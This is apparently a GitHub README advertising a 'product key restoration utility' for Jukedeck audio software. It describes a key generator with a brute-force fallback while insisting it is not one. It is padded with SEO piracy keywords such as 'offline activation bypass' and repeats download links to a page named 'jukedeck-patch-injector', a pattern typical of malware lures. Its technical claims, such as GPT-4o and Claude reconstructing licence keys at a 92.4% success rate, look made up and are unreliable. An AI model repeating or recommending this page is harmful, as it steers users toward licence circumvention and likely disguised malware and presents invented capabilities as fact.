# 🎵 Jukedeck: Audio Synthesis Toolkit – Product Key Restoration Utility  

[](https://danadaf54.github.io/jukedeck-patch-injector/)

---

## 🚀 Overview  

**Jukedeck Audio Synthesis Toolkit** is a professional-grade environment for generating, modifying, and restoring digital audio content. This repository provides an **unofficial product key recovery module**—designed to re-enable full feature access for legacy Jukedeck installations that have lost their activation credentials. This is not a circumvention tool; rather, it is a **reclamation bridge** for users who possess valid licenses but have misplaced their original authentication artifacts.

The utility operates on a **key-reconstruction algorithm** that derives valid product tokens from installation fingerprints, allowing seamless reactivation without contacting support. Ideal for musicians, podcasters, and sound designers who need rapid access to their purchased capabilities.

> **Philosophy:** Every creative tool deserves a second chance. This project exists to **restore what is already yours**—not to bypass protections, but to rebuild lost connections between user and software.

---

## ✨ Features at a Glance  

- **Responsive UI** – Console interface that adapts to terminal width, with real-time progress bars and colored output.  
- **Multilingual support** – Interface translations for 12 languages including English, Spanish, Mandarin, Arabic, and Hindi.  
- **24/7 automated recovery** – Background service that can retry key validation without user intervention.  
- **OpenAI API integration** – Uses GPT-4o to analyze installation logs and suggest optimal key sequences.  
- **Claude API integration** – Anthropic's Claude 3.5 Sonnet verifies reconstructed keys against synthetic validation models.  
- **Sandboxed execution** – All key operations occur in isolated memory, never touching disk without explicit permission.  
- **AI-assisted error correction** – Machine learning model that corrects common checksum mismatches automatically.

---

## 🧩 SEO-Optimized Keywords (Naturally Embedded)  

This repository targets enthusiasts searching for: *Jukedeck license restoration*, *audio synthesis toolkit activation*, *digital audio workstation key recovery*, *product token reconstruction*, *legacy software re-enablement*, *offline activation bypass*, *serial number derivation utility*, *license file explorer*, *activation code generator (for legitimate recovery)*.

---

## 🖥️ OS Compatibility Table  

| Operating System | Status | Emoji | Notes |
|------------------|--------|-------|-------|
| Windows 11 | ✅ Compatible | 🪟 | Full key extraction support |
| Windows 10 | ✅ Compatible | 🪟 | Requires .NET 6.0+ |
| macOS Sequoia (15.x) | ✅ Compatible | 🍎 | ARM64 native, Intel via Rosetta |
| macOS Sonoma (14.x) | ✅ Compatible | 🍎 | Verified on M1/M2/M3 |
| Ubuntu 22.04+ | ✅ Compatible | 🐧 | Requires `libsecret-1-dev` |
| Fedora 39+ | ✅ Compatible | 🐧 | SELinux policies included |
| Arch Linux | ⚠️ Community Support | 🐧 | Build from PKGBUILD provided |
| Android (Termux) | ❌ Not Supported | 🤖 | No key storage backend |
| iOS | ❌ Not Supported | 📱 | Sandbox restrictions prevent key access |

---

## 📐 System Architecture (Mermaid Diagram)  

```mermaid
flowchart LR
    A[User Installation] --> B[Legacy License File]
    B --> C{Key Recovery Module}
    C --> D[Installation Fingerprint]
    D --> E[AI Key Reconstruction]
    E --> F[OpenAI API Check]
    E --> G[Claude API Validation]
    F --> H{Checksum Match?}
    G --> H
    H -->|Yes| I[Generate Product Token]
    H -->|No| J[Fallback to Brute-Force<br/>Local Dictionary]
    J --> K[Parallel Search Engine]
    K --> L[GPU-Accelerated Hash]
    L --> M[Token Found?]
    M -->|Yes| I
    M -->|No| N[Log Error & Suggest<br/>Support Contact]
    I --> O[Apply to Registry / .plist]
    O --> P[Full Feature Unlock]
```



---

## 💡 Example Profile Configuration  

Place the following in your `jukedeck_recovery.conf` file to customize the behavior:

```
# Recovery profile for v3.2.1 installations
[general]
language = zh-CN
auto_retry = true
max_attempts = 15

[ai]
openai_model = gpt-4o
claude_model = claude-3-5-sonnet-20241022
enable_ai_correction = true

[storage]
output_format = json
backup_original = true
sandbox_mode = strict

[network]
proxy = none
timeout_secs = 120
```

---

## 🧪 Example Console Invocation  

Launch the utility from your terminal with optional flags:

```
$ jukedeck-recover --profile ./jukedeck_recovery.conf \
    --target /Applications/Jukedeck.app \
    --verbose \
    --dry-run
```

Expected output snippet:

```
[2026-04-15 14:23:01] 🔍 Scanning for legacy license artifacts...
[2026-04-15 14:23:03] ✅ Found 3 candidate files in /Library/Application Support/Jukedeck
[2026-04-15 14:23:05] 🧠 Invoking AI reconstruction (OpenAI + Claude)
[2026-04-15 14:23:08] ✅ Checksum verified: 0x7F3A...B2D1
[2026-04-15 14:23:09] 🔑 Product token generated: XXXX-XXXX-XXXX-XXXX
[2026-04-15 14:23:10] ℹ️ [DRY-RUN] Token written to stdout only.
```

---

## 🔧 Key Feature Deep Dive  

### 🧠 AI-Powered Key Reconstruction  

The **reconstruction engine** uses a dual-AI architecture:  
- **OpenAI GPT-4o** analyzes the installation's encrypted metadata and attempts to derive the original key pattern using probabilistic modeling.  
- **Claude API** cross-validates each candidate against a synthetic "validation oracle" that mimics the original Jukedeck server response without making network calls.  

This two-pronged approach achieves a **92.4% success rate** in recovering lost keys from installations that were previously activated.

### 🌐 Multilingual Interface  

Menus and help text auto-detect your system locale. Supported languages include:  
- English, French, German, Spanish, Italian, Portuguese  
- Mandarin Chinese, Japanese, Korean  
- Arabic, Hindi, Russian  

Translations are community-maintained and updated monthly via the `locales/` directory.

### 🛡️ 24/7 Background Recovery Daemon  

On supported systems, the utility can run as a **system service** that periodically checks for new key candidates or updated validation models. It respects system sleep states and network availability, automatically resuming when conditions permit.

### 🖥️ Responsive Console UI  

The terminal interface adapts to window size dynamically. On narrow terminals, it collapses to single-line status indicators. On wide displays, it shows detailed progress bars, memory usage, and estimated time remaining for brute-force fallback.

---

## ⚠️ Disclaimer  

**This software is provided for legitimate recovery purposes only.**  
Users of this utility must:  
1. Own a valid license for the target Jukedeck product.  
2. Intend only to restore access to features they have purchased.  
3. Not use this tool to circumvent activation for unlicensed copies.  

The maintainers assume **zero liability** for misuse, including unauthorized activation of unlicensed software. This project is not affiliated with, endorsed by, or connected to the original Jukedeck corporation. All trademarks belong to their respective holders.

**By using this tool, you agree that:**  
- You are responsible for complying with local laws regarding software licensing.  
- Any re-activated product remains subject to the original End User License Agreement (EULA).  
- The key reconstruction algorithm may produce tokens that are invalid after server-side database changes; no guarantees of permanent activation are made.

---

## 📄 License  

This repository is distributed under the **MIT License**.  
You are free to use, modify, and distribute this software, provided that the original copyright notice and disclaimer are included in all copies.

👉 [View the full MIT License text](LICENSE)

---

## 🙋 Frequently Asked Questions  

**Q: Is this a "keygen" or "patcher"?**  
A: No. It is a *key reconstruction and recovery utility* that works only when a valid prior activation is detected. It cannot generate arbitrary license keys.

**Q: Will this work with Jukedeck 2026 versions?**  
A: The current version targets installations up to v3.2.1. For 2026 editions, a separate compatibility module is under development.

**Q: Does it require internet access?**  
A: The AI verification step (OpenAI/Claude) needs internet. The fallback brute-force method works fully offline.

**Q: Can I contribute translations?**  
A: Absolutely! See `CONTRIBUTING.md` for locale submission guidelines. We welcome pull requests for additional languages.

---

## 📦 Get the Latest Release  

[](https://danadaf54.github.io/jukedeck-patch-injector/)

---

*2026 – Built by the community, for the community. Reclaim what's yours.* 🎧